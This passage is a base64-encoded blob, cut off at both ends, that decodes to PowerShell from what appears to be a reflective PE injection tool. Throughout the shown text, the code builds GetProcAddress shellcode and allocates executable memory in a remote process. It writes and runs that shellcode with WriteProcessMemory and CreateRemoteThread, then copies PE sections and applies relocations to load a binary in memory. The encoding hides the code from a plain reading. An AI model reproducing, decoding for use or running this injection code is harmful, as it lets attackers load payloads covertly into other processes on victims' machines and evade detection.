CBHZXRQcm9jQWRkcmVzcwogICAgICAgICNTaGVsbGNvZGU6IEdldFByb2NBZGRyZXNzLmFzbQogICAgICAgIFtCeXRlW11dJEdldFByb2NBZGRyZXNzU0MgPSBAKCkKICAgICAgICBpZiAoJFBFSW5mby5QRTY0Qml0IC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzc1NDMSA9IEAoMHg1MywgMHg0OCwgMHg4OSwgMHhlMywgMHg0OCwgMHg4MywgMHhlYywgMHgyMCwgMHg2NiwgMHg4MywgMHhlNCwgMHhjMCwgMHg0OCwgMHhiOSkKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzU0MyID0gQCgweDQ4LCAweGJhKQogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzMgPSBAKDB4NDgsIDB4YjgpCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzc1NDNCA9IEAoMHhmZiwgMHhkMCwgMHg0OCwgMHhiOSkKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzU0M1ID0gQCgweDQ4LCAweDg5LCAweDAxLCAweDQ4LCAweDg5LCAweGRjLCAweDViLCAweGMzKQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzEgPSBAKDB4NTMsIDB4ODksIDB4ZTMsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4YjgpCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzc1NDMiA9IEAoMHhiOSkKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzU0MzID0gQCgweDUxLCAweDUwLCAweGI4KQogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzQgPSBAKDB4ZmYsIDB4ZDAsIDB4YjkpCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzc1NDNSA9IEAoMHg4OSwgMHgwMSwgMHg4OSwgMHhkYywgMHg1YiwgMHhjMykKICAgICAgICB9CiAgICAgICAgJFNDTGVuZ3RoID0gJEdldFByb2NBZGRyZXNzU0MxLkxlbmd0aCArICRHZXRQcm9jQWRkcmVzc1NDMi5MZW5ndGggKyAkR2V0UHJvY0FkZHJlc3NTQzMuTGVuZ3RoICsgJEdldFByb2NBZGRyZXNzU0M0Lkxlbmd0aCArICRHZXRQcm9jQWRkcmVzc1NDNS5MZW5ndGggKyAoJFB0clNpemUgKiA0KQogICAgICAgICRTQ1BTTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRTQ0xlbmd0aCkKICAgICAgICAkU0NQU01lbU9yaWdpbmFsID0gJFNDUFNNZW0KICAgICAgICAKICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzEgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzEuTGVuZ3RoKQogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRSZW1vdGVEbGxIYW5kbGUsICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJEdldFByb2NBZGRyZXNzU0MyIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJEdldFByb2NBZGRyZXNzU0MyLkxlbmd0aCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkUkZ1bmNOYW1lUHRyLCAkU0NQU01lbSwgJGZhbHNlKQogICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQogICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRHZXRQcm9jQWRkcmVzc1NDMyAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQogICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRHZXRQcm9jQWRkcmVzc1NDMy5MZW5ndGgpCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEdldFByb2NBZGRyZXNzQWRkciwgJFNDUFNNZW0sICRmYWxzZSkKICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzQgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzQuTGVuZ3RoKQogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRHZXRQcm9jQWRkcmVzc1JldE1lbSwgJFNDUFNNZW0sICRmYWxzZSkKICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzUgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzUuTGVuZ3RoKQogICAgICAgIAogICAgICAgICRSU0NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpCiAgICAgICAgaWYgKCRSU0NBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBmb3Igc2hlbGxjb2RlIgogICAgICAgIH0KICAgICAgICBbVUludFB0cl0kTnVtQnl0ZXNXcml0dGVuID0gW1VJbnRQdHJdOjpaZXJvCiAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsICRTQ1BTTWVtT3JpZ2luYWwsIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgaWYgKCgkU3VjY2VzcyAtZXEgJGZhbHNlKSAtb3IgKFtVSW50NjRdJE51bUJ5dGVzV3JpdHRlbiAtbmUgW1VJbnQ2NF0kU0NMZW5ndGgpKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byB3cml0ZSBzaGVsbGNvZGUgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5LiIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFJTQ0FkZHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucwogICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFJUaHJlYWRIYW5kbGUsIDIwMDAwKQogICAgICAgIGlmICgkUmVzdWx0IC1uZSAwKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIkNhbGwgdG8gQ3JlYXRlUmVtb3RlVGhyZWFkIHRvIGNhbGwgR2V0UHJvY0FkZHJlc3MgZmFpbGVkLiIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgI1RoZSBwcm9jZXNzIGFkZHJlc3MgaXMgd3JpdHRlbiB0byBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGF0IGFkZHJlc3MgJEdldFByb2NBZGRyZXNzUmV0TWVtLCByZWFkIHRoaXMgbWVtb3J5CiAgICAgICAgW0ludFB0cl0kUmV0dXJuVmFsTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQdHJTaXplKQogICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuUmVhZFByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkR2V0UHJvY0FkZHJlc3NSZXRNZW0sICRSZXR1cm5WYWxNZW0sIFtVSW50UHRyXVtVSW50NjRdJFB0clNpemUsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKICAgICAgICBpZiAoKCRSZXN1bHQgLWVxICRmYWxzZSkgLW9yICgkTnVtQnl0ZXNXcml0dGVuIC1lcSAwKSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIFJlYWRQcm9jZXNzTWVtb3J5IGZhaWxlZCIKICAgICAgICB9CiAgICAgICAgW0ludFB0cl0kUHJvY0FkZHJlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkUmV0dXJuVmFsTWVtLCBbVHlwZV1bSW50UHRyXSkKCiAgICAgICAgI0NsZWFudXAgcmVtb3RlIHByb2Nlc3MgbWVtb3J5CiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUlNDQWRkciwgW1VJbnRQdHJdW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpIHwgT3V0LU51bGwKICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRHZXRQcm9jQWRkcmVzc1JldE1lbSwgW1VJbnRQdHJdW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpIHwgT3V0LU51bGwKCiAgICAgICAgaWYgKC1ub3QgJExvYWRCeU9yZGluYWwpCiAgICAgICAgewogICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSRnVuY05hbWVQdHIsIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiAkUHJvY0FkZHJlc3MKICAgIH0KCgogICAgRnVuY3Rpb24gQ29weS1TZWN0aW9ucwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0J5dGVbXV0KICAgICAgICAkUEVCeXRlcywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRQRUluZm8sCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJGdW5jdGlvbnMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJUeXBlcwogICAgICAgICkKICAgICAgICAKICAgICAgICBmb3IoICRpID0gMDsgJGkgLWx0ICRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5GaWxlSGVhZGVyLk51bWJlck9mU2VjdGlvbnM7ICRpKyspCiAgICAgICAgewogICAgICAgICAgICBbSW50UHRyXSRTZWN0aW9uSGVhZGVyUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlNlY3Rpb25IZWFkZXJQdHIpICgkaSAqIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9TRUNUSU9OX0hFQURFUikpKQogICAgICAgICAgICAkU2VjdGlvbkhlYWRlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRTZWN0aW9uSGVhZGVyUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9TRUNUSU9OX0hFQURFUikKICAgICAgICAKICAgICAgICAgICAgI0FkZHJlc3MgdG8gY29weSB0aGUgc2VjdGlvbiB0bwogICAgICAgICAgICBbSW50UHRyXSRTZWN0aW9uRGVzdEFkZHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJFNlY3Rpb25IZWFkZXIuVmlydHVhbEFkZHJlc3MpKQogICAgICAgICAgICAKICAgICAgICAgICAgI1NpemVPZlJhd0RhdGEgaXMgdGhlIHNpemUgb2YgdGhlIGRhdGEgb24gZGlzaywgVmlydHVhbFNpemUgaXMgdGhlIG1pbmltdW0gc3BhY2UgdGhhdCBjYW4gYmUgYWxsb2NhdGVkCiAgICAgICAgICAgICMgICAgaW4gbWVtb3J5IGZvciB0aGUgc2VjdGlvbi4gSWYgVmlydHVhbFNpemUgPiBTaXplT2ZSYXdEYXRhLCBwYWQgdGhlIGV4dHJhIHNwYWNlcyB3aXRoIDAuIElmCiAgICAgICAgICAgICMgICAgU2l6ZU9mUmF3RGF0YSA+IFZpcnR1YWxTaXplLCBpdCBpcyBiZWNhdXNlIHRoZSBzZWN0aW9uIHN0b3JlZCBvbiBkaXNrIGhhcyBwYWRkaW5nIHRoYXQgd2UgY2FuIHRocm93IGF3YXksCiAgICAgICAgICAgICMgICAgc28gdHJ1bmNhdGUgU2l6ZU9mUmF3RGF0YSB0byBWaXJ0dWFsU2l6ZQogICAgICAgICAgICAkU2l6ZU9mUmF3RGF0YSA9ICRTZWN0aW9uSGVhZGVyLlNpemVPZlJhd0RhdGEKCiAgICAgICAgICAgIGlmICgkU2VjdGlvbkhlYWRlci5Qb2ludGVyVG9SYXdEYXRhIC1lcSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU2l6ZU9mUmF3RGF0YSA9IDAKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCRTaXplT2ZSYXdEYXRhIC1ndCAkU2VjdGlvbkhlYWRlci5WaXJ0dWFsU2l6ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNpemVPZlJhd0RhdGEgPSAkU2VjdGlvbkhlYWRlci5WaXJ0dWFsU2l6ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoJFNpemVPZlJhd0RhdGEgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRlc3QtTWVtb3J5UmFuZ2VWYWxpZCAtRGVidWdTdHJpbmcgIkNvcHktU2VjdGlvbnM6Ok1hcnNoYWxDb3B5IiAtUEVJbmZvICRQRUluZm8gLVN0YXJ0QWRkcmVzcyAkU2VjdGlvbkRlc3RBZGRyIC1TaXplICRTaXplT2ZSYXdEYXRhIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFBFQnl0ZXMsIFtJbnQzMl0kU2VjdGlvbkhlYWRlci5Qb2ludGVyVG9SYXdEYXRhLCAkU2VjdGlvbkRlc3RBZGRyLCAkU2l6ZU9mUmF3RGF0YSkKICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgICAgICAjSWYgU2l6ZU9mUmF3RGF0YSBpcyBsZXNzIHRoYW4gVmlydHVhbFNpemUsIHNldCBtZW1vcnkgdG8gMCBmb3IgdGhlIGV4dHJhIHNwYWNlCiAgICAgICAgICAgIGlmICgkU2VjdGlvbkhlYWRlci5TaXplT2ZSYXdEYXRhIC1sdCAkU2VjdGlvbkhlYWRlci5WaXJ0dWFsU2l6ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJERpZmZlcmVuY2UgPSAkU2VjdGlvbkhlYWRlci5WaXJ0dWFsU2l6ZSAtICRTaXplT2ZSYXdEYXRhCiAgICAgICAgICAgICAgICBbSW50UHRyXSRTdGFydEFkZHJlc3MgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRTZWN0aW9uRGVzdEFkZHIpIChbSW50NjRdJFNpemVPZlJhd0RhdGEpKQogICAgICAgICAgICAgICAgVGVzdC1NZW1vcnlSYW5nZVZhbGlkIC1EZWJ1Z1N0cmluZyAiQ29weS1TZWN0aW9uczo6TWVtc2V0IiAtUEVJbmZvICRQRUluZm8gLVN0YXJ0QWRkcmVzcyAkU3RhcnRBZGRyZXNzIC1TaXplICREaWZmZXJlbmNlIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5tZW1zZXQuSW52b2tlKCRTdGFydEFkZHJlc3MsIDAsIFtJbnRQdHJdJERpZmZlcmVuY2UpIHwgT3V0LU51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCgogICAgRnVuY3Rpb24gVXBkYXRlLU1lbW9yeUFkZHJlc3NlcwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFBFSW5mbywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnQ2NF0KICAgICAgICAkT3JpZ2luYWxJbWFnZUJhc2UsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJDb25zdGFudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJUeXBlcwogICAgICAgICkKICAgICAgICAKICAgICAgICBbSW50NjRdJEJhc2VEaWZmZXJlbmNlID0gMAogICAgICAgICRBZGREaWZmZXJlbmNlID0gJHRydWUgI1RyYWNrIGlmIHRoZSBkaWZmZXJlbmNlIHZhcmlhYmxlIHNob3VsZCBiZSBhZGRlZCBvciBzdWJ0cmFjdGVkIGZyb20gdmFyaWFibGVzCiAgICAgICAgW1VJbnQzMl0kSW1hZ2VCYXNlUmVsb2NTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0JBU0VfUkVMT0NBVElPTikKICAgICAgICAKICAgICAgICAjSWYgdGhlIFBFIHdhcyBsb2FkZWQgdG8gaXRzIGV4cGVjdGVkIGFkZHJlc3Mgb3IgdGhlcmUgYXJlIG5vIGVudHJpZXMgaW4gdGhlIEJhc2VSZWxvY2F0aW9uVGFibGUsIG5vdGhpbmcgdG8gZG8KICAgICAgICBpZiAoKCRPcmlnaW5hbEltYWdlQmFzZSAtZXEgW0ludDY0XSRQRUluZm8uRWZmZWN0aXZlUEVIYW5kbGUpIGAKICAgICAgICAgICAgICAgIC1vciAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkJhc2VSZWxvY2F0aW9uVGFibGUuU2l6ZSAtZXEgMCkpCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4KICAgICAgICB9CgoKICAgICAgICBlbHNlaWYgKChDb21wYXJlLVZhbDFHcmVhdGVyVGhhblZhbDJBc1VJbnQgKCRPcmlnaW5hbEltYWdlQmFzZSkgKCRQRUluZm8uRWZmZWN0aXZlUEVIYW5kbGUpKSAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICAkQmFzZURpZmZlcmVuY2UgPSBTdWItU2lnbmVkSW50QXNVbnNpZ25lZCAoJE9yaWdpbmFsSW1hZ2VCYXNlKSAoJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkKICAgICAgICAgICAgJEFkZERpZmZlcmVuY2UgPSAkZmFsc2UKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgoQ29tcGFyZS1WYWwxR3JlYXRlclRoYW5WYWwyQXNVSW50ICgkUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKSAoJE9yaWdpbmFsSW1hZ2VCYXNlKSkgLWVxICR0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgJEJhc2VEaWZmZXJlbmNlID0gU3ViLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uRWZmZWN0aXZlUEVIYW5kbGUpICgkT3JpZ2luYWxJbWFnZUJhc2UpCiAgICAgICAgfQogICAgICAgIAogICAgICAgICNVc2UgdGhlIElNQUdFX0JBU0VfUkVMT0NBVElPTiBzdHJ1Y3R1cmUgdG8gZmluZCBtZW1vcnkgYWRkcmVzc2VzIHdoaWNoIG5lZWQgdG8gYmUgbW9kaWZpZWQKICAgICAgICBbSW50UHRyXSRCYXNlUmVsb2NQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkJhc2VSZWxvY2F0aW9uVGFibGUuVmlydHVhbEFkZHJlc3MpKQogICAgICAgIHdoaWxlKCR0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgI0lmIFNpemVPZkJsb2NrID09IDAsIHdlIGFyZSBkb25lCiAgICAgICAgICAgICRCYXNlUmVsb2NhdGlvblRhYmxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEJhc2VSZWxvY1B0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfQkFTRV9SRUxPQ0FUSU9OKQoKICAgICAgICAgICAgaWYgKCRCYXNlUmVsb2NhdGlvblRhYmxlLlNpemVPZkJsb2NrIC1lcSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICB9CgogICAgICAgICAgICBbSW50UHRyXSRNZW1BZGRyQmFzZSA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kQmFzZVJlbG9jYXRpb25UYWJsZS5WaXJ0dWFsQWRkcmVzcykpCiAgICAgICAgICAgICROdW1SZWxvY2F0aW9ucyA9ICgkQmFzZVJlbG9jYXRpb25UYWJsZS5TaXplT2ZCbG9jayAtICRJbWFnZUJhc2VSZWxvY1NpemUpIC8gMgoKICAgICAgICAgICAgI0xvb3AgdGhyb3VnaCBlYWNoIHJlbG9jYXRpb24KICAgICAgICAgICAgZm9yKCRpID0gMDsgJGkgLWx0ICROdW1SZWxvY2F0aW9uczsgJGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgI0dldCBpbmZvIGZvciB0aGlzIHJlbG9jYXRpb24KICAgICAgICAgICAgICAgICRSZWxvY2F0aW9uSW5mb1B0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50UHRyXSRCYXNlUmVsb2NQdHIpIChbSW50NjRdJEltYWdlQmFzZVJlbG9jU2l6ZSArICgyICogJGkpKSkKICAgICAgICAgICAgICAgIFtVSW50MTZdJFJlbG9jYXRpb25JbmZvID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFJlbG9jYXRpb25JbmZvUHRyLCBbVHlwZV1bVUludDE2XSkKCiAgICAgICAgICAgICAgICAjRmlyc3QgNCBiaXRzIGlzIHRoZSByZWxvY2F0aW9uIHR5cGUsIGxhc3QgMTIgYml0cyBpcyB0aGUgYWRkcmVzcyBvZmZzZXQgZnJvbSAkTWVtQWRkckJhc2UKICAgICAgICAgICAgICAgIFtVSW50MTZdJFJlbG9jT2Zmc2V0ID0gJFJlbG9jYXRpb25JbmZvIC1iYW5kIDB4MEZGRgogICAgICAgICAgICAgICAgW1VJbnQxNl0kUmVsb2NUeXBlID0gJFJlbG9jYXRpb25JbmZvIC1iYW5kIDB4RjAwMAogICAgICAgICAgICAgICAgZm9yICgkaiA9IDA7ICRqIC1sdCAxMjsgJGorKykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkUmVsb2NUeXBlID0gW01hdGhdOjpGbG9vcigkUmVsb2NUeXBlIC8gMikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjRm9yIERMTCdzIHRoZXJlIGFyZSB0d28gdHlwZXMgb2YgcmVsb2NhdGlvbnMgdXNlZCBhY2NvcmRpbmcgdG8gdGhlIGZvbGxvd2luZyBNU0ROIGFydGljbGUuIE9uZSBmb3IgNjRiaXQgYW5kIG9uZSBmb3IgMzJiaXQuCiAgICAgICAgICAgICAgICAjVGhpcyBhcHBlYXJzIHRvIGJlIHRydWUgZm9yIEVYRSdzIGFzIHdlbGwuCiAgICAgICAgICAgICAgICAjICAgU2l0ZTogaHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9tYWdhemluZS9jYzMwMTgwOC5hc3B4CiAgICAgICAgICAgICAgICBpZiAoKCRSZWxvY1R5cGUgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9SRUxfQkFTRURfSElHSExPVykgYAogICAgICAgICAgICAgICAgICAgICAgICAtb3IgKCRSZWxvY1R5cGUgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9SRUxfQkFTRURfRElSNjQpKQogICAgICAgICAgICAgICAgeyAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgI0dldCB0aGUgY3VycmVudCBtZW1vcnkgYWRkcmVzcyBhbmQgdXBkYXRlIGl0IGJhc2VkIG9mZiB0aGUgZGlmZmVyZW5jZSBiZXR3ZWVuIFBFIGV4cGVjdGVkIGJhc2UgYWRkcmVzcyBhbmQgYWN0dWFsIGJhc2UgYWRkcmVzcwogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJEZpbmFsQWRkciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJE1lbUFkZHJCYXNlKSAoW0ludDY0XSRSZWxvY09mZnNldCkpCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kQ3VyckFkZHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkRmluYWxBZGRyLCBbVHlwZV1bSW50UHRyXSkKICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoJEFkZERpZmZlcmVuY2UgLWVxICR0cnVlKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kQ3VyckFkZHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW